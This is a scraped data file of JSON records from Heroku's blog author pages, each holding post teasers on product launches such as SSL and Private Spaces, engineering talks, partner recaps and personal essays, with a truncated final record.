{"website": "Heroku", "title": null, "author": ["Email", "Brett Goulder", "Brett Goulder", "Brett Goulder", "Brett Goulder", "Brett Goulder", "Brett Goulder"], "link": "https://blog.heroku.com/authors/brett-goulder", "abstract": "Announcing the Dublin, Ireland Region for Heroku Private Spaces news September 26, 2017 Brett Goulder We are excited to announce the Dublin region for Heroku Private Spaces is now generally available for Heroku Enterprise customers. Dublin joins the growing list of regions that Private Spaces supports: Sydney, Virginia, Oregon, Frankfurt, and Tokyo. With the Private Spaces Dublin region, organizations can build and deploy Heroku-style apps closer to their UK customers, reducing network latency and providing a better user experience. Heroku Private Spaces, available as part of Heroku Enterprise , is a network isolated group of apps and data services with a dedicated runtime environment, provisioned by Heroku in a geographic region you specify. With Spaces you can build modern apps with the... Read more Announcing DNS Service Discovery for Heroku Private Spaces: Microservices Communication, Made Easy news May 31, 2017 Brett Goulder Today, we are excited to announce DNS Service Discovery for Heroku Private Spaces, an easy way to find and coordinate services for microservice-style deployments. As applications grow in sophistication and scale, developers often organize their applications into small, purpose-built “microservices”. These microservice systems act in unison to achieve what otherwise would be handled by a single, larger monolithic application, which serves the benefit of simplifying applications’ codebases and improving their overall reliability. DNS Service Discovery is a valuable component of a true microservices architecture. It is a simple, yet effective way to facilitate microservice-style application... Read more Announcing Free and Automated SSL Certs For All Paid Dynos news March 21, 2017 Brett Goulder We are happy to announce the general availability of Automated Certificate Management (ACM) for all paid Heroku dynos. With ACM, the cumbersome and costly process of provisioning and managing SSL certificates is replaced with a simple experience that is free for all paid Dynos on Heroku’s Common Runtime . Creating secure web applications has never been more important, and with ACM and the Let’s Encrypt project, never easier. ACM handles all aspects of SSL/TLS certificates for custom domains; you no longer have to purchase certificates, or worry about their expiration or renewal. ACM builds directly on our recent release of Heroku Free SSL to make encryption the default for web applications... Read more SSL Is Now Included on All Paid Dynos news September 22, 2016 Brett Goulder Encrypted communication is now the norm for applications on the Internet. At Heroku, part of our mission is to spread encryption by making it easy for developers to setup and use SSL on every application. Today we take a big step forward in that mission by making Heroku SSL generally available, allowing you to easily add SSL encryption to your applications with nothing more than a valid SSL certificate and custom domain. Heroku SSL is free for custom domains on Hobby dynos and above and relies on the SNI (“Server Name Indication”) extension which is now supported by the vast majority of browsers and client libraries. The current SSL endpoint will remain available for the increasingly rare... Read more Announcing Heroku Free SSL Beta and Flexible Dyno Hours news May 18, 2016 Brett Goulder Editor's Note: SSL Is Now Included on All Paid Dynos as of September 22, 2016 At Heroku, we want to make it easy for everyone to be able to learn and explore our service, and the related ecosystem of technologies, for free - be it student, professional developer, hobbyist or just curious individual. We view this as both part of our mission and our business model; it has never been a more interesting - or important - time to be a developer, and we want to help everyone become one. Today we are announcing two important updates to help bring us closer to that goal: a new and free SSL service and a more flexible way to use free dyno hours. Heroku SSL is being introduced as beta today, and... Read more Introducing Improved Performance Dynos news August 20, 2015 Brett Goulder Last year, we launched the original Performance dyno, designed to support the largest apps running at-scale with more consistent service and faster response times. Today, with the goal of continuing to support our fast growing customers with more flexibility to choose the type of dynos best for their applications, we are excited to announce improvements to our performance dyno lineup: Performance-L — an improved and more powerful version of the existing Performance dyno, renamed the Performance-L dyno Performance-M — an entirely new dyno and smaller sibling to the Performance-L dyno The Performance-L dyno now has 14GB of RAM, 133% more RAM than the previous version, answering a request... Read more", "date": "2017-09-26,"},
{"website": "Heroku", "title": null, "author": ["Brandur Leach"], "link": "https://blog.heroku.com/authors/brandur-leach", "abstract": "Hutils - Explore your structured log data engineering September 04, 2014 Brandur Leach Many of Heroku's internal components make heavy use of logfmt to log information about what's going on in production. The format is hugely valuable in that it allows us to retroactively analyze what happened during any arbitrary request to our components, query our log traces in very flexible ways, and combined with Splunk, easily generate arbitrary metrics on historical data. It's unquestionably been an invaluable tool for fixing countless bugs, tracking down the root cause of many production incidents, and assessing usage in ways that would have been difficult otherwise. Read more", "date": "2014-09-04,"},
{"website": "Heroku", "title": null, "author": ["Blake Mizerany"], "link": "https://blog.heroku.com/authors/blake-mizerany", "abstract": "Experimental Node.js Support news April 28, 2010 Blake Mizerany UPDATE : Node.JS is now officially available on Heroku. Today we’re offering experimental support for node.js to a limited set of users. We know there is a lot of demand, and will work with as many users as we can. See below for details. A natural complement to Ruby Yesterday we posted about how we think about the platform and make roadmap decisions . We are always looking for the next set of use cases to support, and lately we’ve been thinking about realtime apps and event-driven architectures. Today, most Ruby apps are synchronous. By default, all I/O blocks. If you’re uploading a file, polling a service, or waiting on data, your app will be blocked. While it’s... Read more", "date": "2010-04-28,"},
{"website": "Heroku", "title": null, "author": ["Blake Gentry", "Blake Gentry"], "link": "https://blog.heroku.com/authors/blake-gentry", "abstract": "Auto-generating a Go API client for Heroku news January 09, 2014 Blake Gentry Editor's note: This is a cross post from Blake Gentry , an engineer at Heroku. This is a post about the recently announced Heroku Platform API JSON Schema and how I used that schema to write an auto-generated Go client for the API. Heroku's API team has spent a large part of the past year designing a new version of the platform API . While this is the 3rd incarnation of the API, neither of the two previous versions were publicly documented. In fact, the only documentation on the old APIs that was ever published is the source code of the Heroku Rubygem , which powers the Heroku Toolbelt . That worked fairly well at the time for Heroku's Ruby-centric audience, but it was never... Read more Expanded HTTP Method Support news April 20, 2013 Blake Gentry HTTP and its secure variant, HTTPS, are the protocols used by every web client to talk to web applications. A key part of the protocol is the HTTP method . Traditionally, web applications used a very limited set of HTTP methods. It is common for application servers, proxies and routers (such as the Heroku HTTP router) to prevent unknown methods from being used. This unnecessary constraint of the Heroku HTTP router has increasingly become a limitation to developers building modern web applications. In the past, if you tried to use an unsupported HTTP method in your Heroku application, clients would receive a 405 METHOD_NOT_ALLOWED error. As of today, that's no longer the case. The... Read more", "date": "2014-01-09,"},
{"website": "Heroku", "title": null, "author": ["Email", "Bernerd Schaefer"], "link": "https://blog.heroku.com/authors/bernerd-schaefer", "abstract": "Automated Continuous Deployment at Heroku engineering October 22, 2019 Bernerd Schaefer Over the past four years, the Heroku Runtime team has transitioned from occasional, manual deployments to continuous, automated deployments. Changes are now rolled out globally within a few hours of merging any change—without any human intervention. It's been an overwhelmingly positive experience for us. This post describes why we decided to make the change, how we did it, and what we learned along the way. Where We... Read more", "date": "2019-10-22,"},
{"website": "Heroku", "title": null, "author": ["Email", "LinkedIn", "Ben Zhang"], "link": "https://blog.heroku.com/authors/bzhang-heroku-com", "abstract": "Impending Vroom — How Ruckit Will Modernize Construction Right in the Nick of Time life April 07, 2020 Ben Zhang Alex Hendricks turns up the radio in the cabin of his ‘91 Ford LT8501. He’s drowning out the noise of the construction crew 100ft ahead as they make progress on a brand new bridge in Waco, Texas. Alex isn’t here to take in the sight of fresh new infrastructure. He’s in his truck waiting for the go-ahead to deliver a payload of hot mastic asphalt to the bridge crew. Alex has a ticket in his hands that needs a sign-off from the project’s contractor — a signature that proves he made his delivery, and on time. Without it, he doesn’t get paid, and the clock is ticking. Each ticket earns him about $60, and missing any of today’s three deliveries will start to make him sweat. His wife, at home... Read more", "date": "2020-04-07,"},
{"website": "Heroku", "title": null, "author": ["Ben Scofield", "Ben Scofield", "Ben Scofield", "Ben Scofield", "Ben Scofield", "Ben Scofield", "Ben Scofield"], "link": "https://blog.heroku.com/authors/ben-scofield", "abstract": "Heroku at RailsConf in Baltimore news May 12, 2011 Ben Scofield Baltimore, Here We Come! Next week is RailsConf in Baltimore, and Heroku is coming out in force. There will be about a dozen of us attending sessions, manning our booth, and chatting with Rubyists, so definitely keep an eye out for us! To make it a bit easier, here’s a quick summary of when and where we’ll be: Monday, May 16th At 6pm, Ben Scofield will be part of the second annual Ignite RailsConf . He’s giving a five-minute talk on How To Be Awesome (From a Counter-Example) . Tuesday, May 17th The Expo Hall opens up Tuesday morning, so you’ll be able to visit the Heroku booth to find us, talk about deployment, and grab some swag. We’ll be around from... Read more Defaulting to Ruby 1.9.2 news April 28, 2011 Ben Scofield Heroku is fully behind Ruby 1.9.2 as the new gold standard for production Ruby apps. Over the past few months, we’ve seen more and more developers move to the Bamboo 1.9.2 stack. It’s fast, stable, and increasingly sees excellent support throughout the community. In February , we said that we’d be reviewing the state of 1.9.2 support with the eventual goal of switching the default for new Ruby apps on Heroku from 1.8.7 to 1.9.2. Today, we’re announcing the date of that switchover. As of June 1st, 2011, all new Ruby applications on Heroku will be run on Ruby 1.9.2 by default. (Existing applications won’t be affected, and you can always create a new application... Read more The Path Forward: Ruby 1.9.2 news February 09, 2011 Ben Scofield At Heroku, we’ve been watching the progress of MRI very carefully for a while now; we added support for 1.9.1 nearly a year ago and 1.9.2 more recently, and we’ve seen thousands of apps created and running successfully on the 1.9 series of VMs. At the same time, we’ve seen the community as a whole recognize the importance of 1.9 by migrating libraries and gems to it and providing resources and tutorials on upgrading. Today, Heroku is putting our full support behind Ruby 1.9.2 as the future of MRI . It is a stable, battle-tested, production-quality Ruby, and we’re excited to see it become the mainstay for future Ruby development. What this means today We encourage... Read more Win a MacBook Air with Heroku + IndexTank news December 20, 2010 Ben Scofield We’re very excited about the growth of the add-on ecosystem following the launch of the provider program — with dozens of add-ons in various stages of release, our developers have access to a wide variety of functionality for their applications. One of the most recent additions to the generally-available add-on catalog is IndexTank , a real-time search-as-a-service with some great features. In order to celebrate their release, IndexTank is sponsoring a contest over the holiday season. From last week until January 6th, they’re inviting developers to build the best app they can using the IndexTank add-on. You can see the full details over on IndexTank’s blog , but the... Read more HUG Recap news November 04, 2010 Ben Scofield Last night, we threw our first-ever Heroku Users Group meetup, and it was a hit! Fifty Heroku users, add-on developers, entrepreneurs, and more gathered at our new office to get to know the Heroku team and swap stories with each other. We heard about some of the remarkable applications people are building on the platform, and we’re very excited to publicize those more — at future HUGs, in our newsletter, and here on the blog. For this first meetup, though, we decided to open the curtains around Heroku’s inner workings a bit. Adam gave a great talk about five new features that should make life easier, particularly for people working on large-scale applications: ... Read more HUG Update news October 28, 2010 Ben Scofield A few weeks ago, we announced our first-ever Heroku Users Group (known henceforth and forever more as a HUG , showing just how much we love our developers!) meetup. We’re now a week away, and we thought it’d be a good time to go into a little more detail about the plan. On November 3rd at 7pm, we’re opening the doors to anyone who uses Heroku – developers who deploy to us, businesses built on our platform, add-on providers who create and manage services for our users, and more. We’re eager to get everyone in the same room, and we’re looking forward to see the new ideas and developments that will come out of all of us talking at this (and at future)... Read more Who wants a HUG? news October 01, 2010 Ben Scofield It’s no secret that Heroku’s getting pretty big. Heck, we advertise the number of apps running on the platform right there on the homepage (over 88,000, when I last looked). We’ve got tens of thousands of developers, and you all have been doing some amazing work — the success stories we’ve posted are only the tip of the iceberg. With that in mind, we thought it was high time we started to get all of you together. So, on November 3rd, we’re going to hold the first official Heroku Users Group meeting. Join us at our office at 7pm to meet other Heroku users and engineers, hear war stories from the front lines, learn tips and tricks, and ask those burning... Read more", "date": "2011-05-12,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "LinkedIn", "Ben Fritsch"], "link": "https://blog.heroku.com/authors/ben-fritsch", "abstract": "Know Your Database Types engineering December 18, 2019 Ben Fritsch This blog post is adapted from a lightning talk by Ben Fritsch at Ruby on Ice 2019. There can be a number of reasons why your application performs poorly, but perhaps none are as challenging as issues stemming from your database. If your database's response times tend to be high, it can cause a strain on your network and your users’ patience. The usual culprit for a slow database is an inefficient query being executed somewhere in your application logic. Usually, you can implement a fix in a number of common ways, by: reducing the amount of open locks (or more detail about database lock debugging in this other blog post by Heroku Engineer Richard Schneeman, The Curious Case of the... Read more", "date": "2019-12-18,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "LinkedIn", "Becky Jaimes", "Becky Jaimes", "Becky Jaimes"], "link": "https://blog.heroku.com/authors/becky-jaimes", "abstract": "Dataclips Power Insights at Heroku engineering July 15, 2019 Becky Jaimes Every organization needs to be data-driven in order to be successful. Whether you're tracking an application's performance, incoming support tickets, or revenue rates, different components of any company depend on metrics that inform the health of the business. At Heroku, we're hackers to the core, but that doesn't mean we're all programmers. We build on top of our own platform for everything we do, and one of the products we often use is Heroku Dataclips. If you haven't heard of them before, Heroku Dataclips allow you to create SQL queries in a web GUI that run on your Heroku Postgres database. The unique dataclip URL can then be shared internally or externally,... Read more A Dialog with Your Data Using the New Dataclips news April 16, 2019 Becky Jaimes The data we store holds value, but refining data into meaning remains a difficult task. Over the last few months, we've taken a step back to figure out what we can do to help our users cross that divide, and rebuilt Heroku Dataclips from scratch with that goal in mind. The result is an experience that makes accessing and working with your data easier than ever, enabling anyone on your team familiar with SQL to take advantage of your most valuable asset without the need for specialized tools or knowledge of the database. Dataclips is a flexible, lightweight way to query your data in Heroku Postgres and share the results. At Heroku, we use them regularly across all of our departments.... Read more PostgreSQL 11 Generally Available on Heroku news March 21, 2019 Becky Jaimes After a successful two-month Beta period, PostgreSQL 11 is now the default version for all new provisioned Heroku Postgres databases. All Postgres extensions, tooling, and integration with the Heroku developer experience are ready to use, giving you the power of PostgreSQL 11 with the ease and usability of Heroku for building data-centric applications. We'd like to re-emphasize a few features - among the many released in Postgres 11 - that we are particularly excited about. Read more", "date": "2019-07-15,"},
{"website": "Heroku", "title": null, "author": ["Balan Subramanian", "Balan Subramanian", "Balan Subramanian"], "link": "https://blog.heroku.com/authors/balan-subramanian", "abstract": "Integrated security with Heroku Identity Federation news September 10, 2015 Balan Subramanian Apps are at the heart of modern businesses, and are important assets that need a secure platform geared for compliance and security. We launched Heroku Enterprise earlier this year with this in mind and today we are excited to announce the beta of Heroku Identity Federation for Heroku Enterprise customers. This feature unifies the login experience across Salesforce's new App Cloud that we announced today. As customers like Forever Living , TV4 and Macy’s run more of their apps and business-critical services on Heroku, they need tighter integration with their existing security infrastructure. With our new identity federation feature, customers can confidently meet compliance mandates... Read more Managing apps and users with fine-grained access controls news July 09, 2015 Balan Subramanian In February, we announced Heroku Enterprise , with collaboration and management capabilities for building and running your app portfolio in a governable and secure way on Heroku. We also introduced fine-grained access controls with app privileges as a beta feature. Today, we are pleased to announce general availability of this feature: Heroku Enterprise accounts are now automatically enabled for fine-grained access controls. We're very happy to deliver this feature that many of our largest customers have requested. \"Enterprises need greater visibility around applications and scalability, and Heroku Enterprise adds those features to the core Heroku value proposition,\" said... Read more Introducing the app.json Application Manifest news May 22, 2014 Balan Subramanian Developers want to spend less time setting up applications and start working with the code sooner. Setting up applications is error-prone, time consuming and interruptive to the development flow. Often, there are several steps to go from your code or other samples and templates that you find in repositories online, to a running application that you can continue to work on. Today, we are excited to introduce the app.json manifest . app.json enables developers to define their applications' details, setup configurations and runtime environments in a structured way. Instead of providing step-by-step instructions, you can now add app.json files to your applications' source code. You... Read more", "date": "2015-09-10,"},
{"website": "Heroku", "title": null, "author": ["Email", "Greg Nokes", "Ayori Selassie"], "link": "https://blog.heroku.com/authors/ayori-selassie", "abstract": "Announcing Heroku Postgres Enhancements: 40x Faster Backups news January 27, 2021 Greg Nokes and Ayori Selassie Today, we’re thrilled to announce backups of Heroku Postgres are now 40x faster by leveraging Snapshots in place of base backups. We’ve been hard at work focused on improving performance, speed, and capacity for the Heroku Data services you rely on. In the past forks and follows of a Premium-8 test database with 992 GB of data took 22 hours; now with Snapshots, the same process is reduced to 10 minutes. This makes the creation of forks and followers, and restoring the database, faster than ever, at no additional charge. The New Way: Snapshots for Heroku Data In November 2020 we introduced a performance improvement to our physical backup and restore functionality for our Heroku... Read more", "date": "2021-01-27,"},
{"website": "Heroku", "title": null, "author": ["LinkedIn", "Arif Gursel", "Arif Gursel", "Arif Gursel", "Arif Gursel", "Arif Gursel", "Arif Gursel"], "link": "https://blog.heroku.com/authors/arif-gursel", "abstract": "Updated Async Provisioning of Add-ons ecosystem March 21, 2018 Arif Gursel Asynchronous provisioning allows add-ons to perform out-of-band provisioning in a first-class way. It’s intended for add-on services that need extended time to set up and help make automated app setup and orchestration easier and less error-prone. The customer will be billed as soon as the add-on starts provisioning. This means the time and cost of provisioning your service is accounted for in how much a customer pays. As such, you should make every effort to provision expediently so customers get value from your service as quickly as possible. Add-ons that take longer than 12 hours to provision (or those your service fails to mark as “provisioned” via the API in that time period) will be... Read more FY18 Q4 recap: Platform API for Partners & New Partner Portal GA ecosystem January 26, 2018 Arif Gursel Need to quickly catch up on this past quarter's announcements? Here are the top three topics to tune in on: The Platform API for Partners provides many official endpoints that allow you to introspect security settings, discover other customer instances of the same add-on, and much more. With the Platform API, add-ons have an OAuth client secret and a number of OAuth authorizations, one token per provisioned add-on; it is only used to authenticate requests to create the scoped tokens and not used to authenticate other requests to the Platform API. Updated password requirements for the add-on manifest go into effect as of December 15, 2017. Add-on manifest password values are required... Read more Updated Platform API for Partners ecosystem January 24, 2018 Arif Gursel The Platform API for Partners provides many official endpoints that the App Info API doesn’t support. These endpoints let you introspect security settings, discover other customer instances of the same add-on, and much more. Platform API for Partners endpoints are also more consistent and “better traveled.” Heroku uses these endpoints internally, and customers also use them directly. With the Platform API, add-ons have an OAuth client secret and a number of OAuth authorizations, one token per provisioned add-on. The OAuth client secret is only used to authenticate requests to create the scoped tokens; it is not used to authenticate other requests to the Platform API. All new add-ons that... Read more FY18 Q3 recap: New Private Spaces Dublin Region Support & Heroku Webhooks GA ecosystem October 27, 2017 Arif Gursel Need to quickly catch up on this past quarter's announcements? Here are the top three topics to tune in on: Heroku has expanded regions availability for Private Spaces and introduced the general availability of the Dublin region on September 26, 2017. Heroku users are able to run apps in all of the following Private Spaces regions: Virginia, Oregon, Frankfurt, Tokyo, Sydney, and Dublin. Please verify that your add-on's manifest accurately reflect the supported Privates Spaces regions. Heroku app webhooks for customers and add-on webhooks for partners are generally available . Partners are able to track many kinds of events relating to add-on resources on apps, domains, builds,... Read more FY18 Q2 recap: Heroku Continuous Integration GA & Ephemeral Apps ecosystem July 28, 2017 Arif Gursel Need to quickly catch up on this past quarter's announcements? Here are the top three topics to tune in on: Heroku announced the general availability of continuous integration (CI) on May 18, 2017. This new feature creates copies of staging apps to run tests, then destroys the app and its add-ons. With Heroku CI, you will see an increase in the number of default ephemeral plan resources regularly provisioned on Heroku review and CI apps. Previously, these apps used the add-on plan configured for staging. As developers adopt CI/CD workflows, temporary deployments are becoming increasingly common. When ephemeral apps and their associated add-ons are destroyed, these actions should not... Read more FY18 Q1 recap: New Add-ons Canary & Heroku Shield Private Spaces GA ecosystem April 28, 2017 Arif Gursel Need to quickly catch up on this past quarter's announcements? Here are the top three topics to tune in on: The new add-ons canary service will attempt to provision and deprovision your add-on service on an app named 'addons-canary'. These daily tests will help us proactively detect any failed provisioning attempts and ensure customers can provision all add-on services. This effort will also help us identify issues earlier and notify you of provisioning issues. Heroku Shield, a set of services included in Heroku Enterprise, is generally available and offers customers additional compliance features needed for building high-compliance applications. Heroku Shield includes Shield... Read more", "date": "2018-03-21,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "LinkedIn", "Ariana Escobar", "Jamie White", "Ariana Escobar", "Jamie White"], "link": "https://blog.heroku.com/authors/ariana-escobar", "abstract": "Designing for Accessibility: Contrast Ratio engineering August 21, 2019 Ariana Escobar and Jamie White This is the second post in a two-part series about accessibility. The first post shares why designing for accessibility is important to us and why we encourage you to incorporate it into your software design process. Heroku’s first accessibility initiative was to reach Level AA for luminance contrast ratio as defined by the internationally recognized best practices of the Web Content Accessibility Guidelines (WCAG) 2.0 . This ratio guarantees the legibility of text against its background, in order to ensure all users can perceive Heroku’s user interfaces equally. This benefits people with color-vision deficiencies (like Deuteranopia or Protanopia which affect 7 to 12% of men), age-related... Read more Equality Through Accessibility life August 15, 2019 Ariana Escobar and Jamie White This is the first post in a two-part series about accessibility. Part two shares our design and development process addressing one aspect of accessibility in the Heroku product. Equality as a Salesforce Value We at Salesforce firmly believe that access to information and the ability to contribute to our digital environment should be recognized as basic human rights, not a nice-to-have features. Globally, hundreds of millions of people have physical, speech, cognitive, and neurological disabilities, and while in practice accessibility is about designing for users with disabilities, it also benefits everyone. Most of us have experienced conditions that impair our ability to get work done... Read more", "date": "2019-08-21,"},
{"website": "Heroku", "title": null, "author": ["Email", "Andrey Petrov", "Andrey Petrov"], "link": "https://blog.heroku.com/authors/andrey-petrov", "abstract": "Neither self nor this: Receivers in Go news July 13, 2016 Andrey Petrov Andrey Petrov is the author of urllib3 , the creator of Briefmetrics and ssh-chat , and a former Googler and Y Combinator alum. He’s back again to free us of our old ways of thinking, so that we can embrace what's really special about receivers in Go. When getting started with Go, there is a strong temptation to bring baggage from your previous language. It’s a heuristic which is usually helpful, but sometimes counter-productive and inevitably results in regret. Go does not have classes and objects, but it does have types that we can make many instances of. Further, we can attach methods to these types and they kind-of start looking like the classes we’re used to. When we attach a... Read more See Python, See Python Go, Go Python Go news June 02, 2016 Andrey Petrov Andrey Petrov is the author of urllib3 , the creator of Briefmetrics and ssh-chat , and a former Googler and YCombinator alum. He’s here to tell us of a dangerous expedition his requests undertook, which sent them from Python, through the land of C, to a place called Go (and back again). Today we're going to make a Python library that is actually the Go webserver, for which we can write handlers in Python. It makes Python servers really fast, and—more importantly—it’s a bit fun and experimental. This post is a more detailed overview of my PyCon 2016 talk of the same title . If you'd like to play along at home, this code was written in Go 1.6 and Python 3.5 and the entire complete... Read more", "date": "2016-07-13,"},
{"website": "Heroku", "title": null, "author": ["Twitter", "GitHub", "Andrew Konoff"], "link": "https://blog.heroku.com/authors/andrew-konoff", "abstract": "Where Will Ruby Go Now? Talking with Tenderlove at RailsConf news May 12, 2016 Andrew Konoff Last week at RailsConf in Kansas City, Terence Lee and Richard Schneeman of Heroku’s Ruby Task Force sat down with the legendary Aaron Patterson (AKA tenderlove). Aaron has been working hard to make Ruby three times faster — a goal that Matz called Ruby 3x3 . Along the way, Aaron has discovered that Ruby may face a hard decision. On one side, Ruby can continue to be the productive, general-purpose scripting language that it looks like today. But the other side of Ruby is that it’s used to run long-running processes in Rails applications, pushing it to be more performant, strongly-typed, and memory-heavy. Ruby can't prioritize both. To find out where Aaron thinks Ruby’s going, you can... Read more", "date": "2016-05-12,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "Andrew Gwozdziewycz"], "link": "https://blog.heroku.com/authors/andrew-gwozdziewycz", "abstract": "Heroku Metrics engineering May 25, 2016 Andrew Gwozdziewycz For almost two years now, the Heroku Dashboard has provided a metrics page to display information about memory usage and CPU load for all of the dynos running an application. Additionally, we've been providing aggregate error metrics, as well as metrics from the Heroku router about incoming requests: average and P95 response time, counts by status, etc. Almost all of this information is being slurped out of an application's log stream via the Log Runtime Metrics labs feature. For applications that don't have this flag enabled, which is most applications on the platform, the relevant logs are still generated, but bypass Logplex , and are instead sent directly to our metrics... Read more", "date": "2016-05-25,"},
{"website": "Heroku", "title": null, "author": ["Email", "LinkedIn", "Anand Gurumurthi"], "link": "https://blog.heroku.com/authors/anand-gurumurthi", "abstract": "Overcoming My Fear of Failure life October 22, 2019 Anand Gurumurthi As part of my MBA at Carnegie Mellon University, I enrolled in a Leadership development certificate program. I was given the opportunity to work with an amazing Leadership Coach, ( Laura Maxwell ). Laura helped me on my journey of \"overcoming my fear of failure\". As part of the program, I was able to share my story with the dean, professors, and the leadership development center at CMU. Since this is a rather common experience, I wanted to share my story with all of you as well. This story starts, as many do, in childhood. Growing up in India, there has always been the expectation that everyone gets good scores in tests and succeeds in any initiative they take part in. This... Read more", "date": "2019-10-22,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "LinkedIn", "Amy Unger"], "link": "https://blog.heroku.com/authors/amy-unger", "abstract": "Seven Ways to Fortify Your Application engineering March 20, 2019 Amy Unger This blog post is adapted from a talk given by Amy Unger at RailsConf 2018 titled \" Knobs, buttons & switches: Operating your application at scale .\" We've all seen applications that keel over when a single, upstream service goes down. Despite our best intentions, sometimes an unexpected outage has us scrambling to make repairs. In this blog post, we'll take a look at some tools you can integrate into your application before disaster strikes. We'll talk about seven strategies that can help you shed load, fail gracefully, and protect struggling services. We'll also talk about the technical implementations of these techniques—particularly in Ruby, though the... Read more", "date": "2019-03-20,"},
{"website": "Heroku", "title": null, "author": ["Ali Hamidi"], "link": "https://blog.heroku.com/authors/ali-hamidi", "abstract": "How Heroku Operates its Multi-Tenant Apache Kafka Services engineering July 11, 2019 Ali Hamidi This blog post is adapted from a talk given by Ali Hamidi at Data Council SF '19 titled \" Operating Multi-Tenant Kafka Services for Developers on Heroku .\" Hi. Welcome to Operating Multi-Tenant Kafka Services for Developers. This is the agenda for the talk. I'm going to give you a little intro about myself and Heroku and Heroku Data. We're going to look at the motivation behind building the multi-tenant Kafka service in general, take a look at our existing single-tenant Kafka, compare that with multi-tenancy and what the multi-tenancy implications are, and then we'll go into some of the configuration changes that we made and some of the tuning that we did. Talk... Read more", "date": "2019-07-11,"},
{"website": "Heroku", "title": null, "author": ["Adam Seligman"], "link": "https://blog.heroku.com/authors/adam-seligman", "abstract": "Facebook Open Graph Momentum news September 23, 2011 Adam Seligman It's been an exciting 24 hours for social application developers. A week ago, Facebook and Heroku announced a partnership to make it incredibly easy to get a live Facebook app running on Heroku. Yesterday at f8, Facebook unveiled the Timeline and the next generation of social apps on the Open Graph, with support for actions and objects. The response has been amazing, and Heroku has seen more than 33,800 new apps created via Facebook in the last 24 hours; that's more than 20 a minute. Facebook has again innovated and captured the excitement of the developer community. To help developers understand and become productive with new Open Graph features, Facebook posted a great... Read more", "date": "2011-09-23,"},
{"website": "Heroku", "title": "Why NoSQL Matters", "author": ["Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins", "Adam Wiggins"], "link": "https://blog.heroku.com/authors/adam-wiggins", "abstract": "Routing and Web Performance on Heroku: a FAQ news April 03, 2013 Adam Wiggins Hi. I'm Adam Wiggins, cofounder and CTO of Heroku. Heroku has been my life’s work. Millions of apps depend on us, and I take that responsibility very personally. Recently, Heroku has faced criticism from the hacker community about how our HTTP router works, and about web performance on the platform in general. I’ve read all the public discussions, and have spent a lot of time over the past month talking with our customers about this subject. The concerns I've heard from you span past, present, and future. The past: some customers have hit serious problems with poor web performance and insufficient visibility on their apps, and have been left very frustrated as a result. What... Read more log2viz: Logs as Data for Performance Visibility news March 19, 2013 Adam Wiggins ** THIS FEATURE IS NOW DEFUNCT ** If you’re building a customer-facing web app or mobile back-end, performance is a critical part of user experience. Fast is a feature , and affects everything from conversion rates to your site’s search ranking . The first step in performance tuning is getting visibility into the app’s web performance in production. For this, we turn to the app’s logs. Logs as data There are many ways to collect metrics, the most common being direct instrumentation into the app. New Relic , Librato , and Hosted Graphite are cloud services that use this approach, and there are numerous roll-your-own options like StatsD and Metrics . Another approach is to send metrics to the... Read more The Heroku Toolbelt news March 09, 2012 Adam Wiggins The Heroku Toolbelt is a package of the Heroku CLI, Foreman, and Git — all the tools you need to get started using Heroku at the command line. The Toolbelt is available as a native installer for OS X, Windows, and Debian/Ubuntu Linux. The Toolbelt has been available since last fall as part of our polyglot platform . Since then it's matured substantially with a huge amount of user testing, and now even has a shiny new landing page . Ruby developers can continue to use gem install heroku , but developers in other languages (Python, Java, Clojure, etc) will probably prefer not to have to install Ruby and RubyGems to use Heroku. The installer won't trample your existing install of Git... Read more InfoWorld Names Heroku a 2012 Technology of the Year news January 19, 2012 Adam Wiggins InfoWorld has named Heroku as a 2012 Technology of the Year . While we're not normally much for industry awards, we feel honored to be included alongside past winners such as the iPad, Android, Visual Studio, and Eclipse; and this year's winners, including Amazon Web Services, Node.js, Hadoop, CloudBees, and Heroku add-on provider Rhomobile . InfoWorld is a venerable publication in the technology world, and this is the first time they've given awards in the cloud space. We see this as another major point of validation for platform-as-a-service, and cloud technologies more generally. 2011 was the year that PaaS came into the greater collective consciousness of the technology... Read more Scala on Heroku news October 03, 2011 Adam Wiggins The sixth official language on the Heroku polyglot platform is Scala , available in public beta on the Cedar stack starting today. Scala deftly blends object-oriented programming with functional programming . It offers an approachable syntax for Java and C developers, the power of a functional language like Erlang or Clojure, and the conciseness and programmer-friendliness normally found in scripting languages such as Ruby or Python. It has found traction with big-scale companies like Twitter and Foursquare, plus many others . Perhaps most notably, Scala offers a path forward for Java developers who seek a more modern programming language. More on those points in a moment. But first,... Read more Python and Django on Heroku news September 28, 2011 Adam Wiggins Python has joined the growing ranks of officially-supported languages on Heroku's polyglot platform , going into public beta as of today. Python is the most-requested language for Heroku, and it brings with it the top-notch Django web framework. As a language, Python has much in common with Ruby, Heroku's origin language. But the Python community has its own unique character. Python has a culture which finds an ideal balance between fast-moving innovation and diligent caution. It emphasizes readability, minimizes \"magic,\" treats documentation as a first-class concern, and has a tradition of well-tested, backward-compatible releases in both the core language and its... Read more Facebook and Heroku news September 15, 2011 Adam Wiggins We're delighted to announce that Facebook and Heroku have teamed up to bring you the fastest and easiest way to get your own Facebook app up and running in the cloud. Facebook apps have long been a major segment on the Heroku platform. From scrappy startups like Cardinal Blue to Hollywood giants like Warner Brothers , Heroku's scale-out capabilities and friction-free workflow enables these innovative companies to easily deliver great social experiences. Now, Facebook has created a fantastic new way to start building a live Facebook app instantly, powered by Heroku. A Quick Tour Start by going to Facebook Developers . Click Create New App and then Cloud Services → 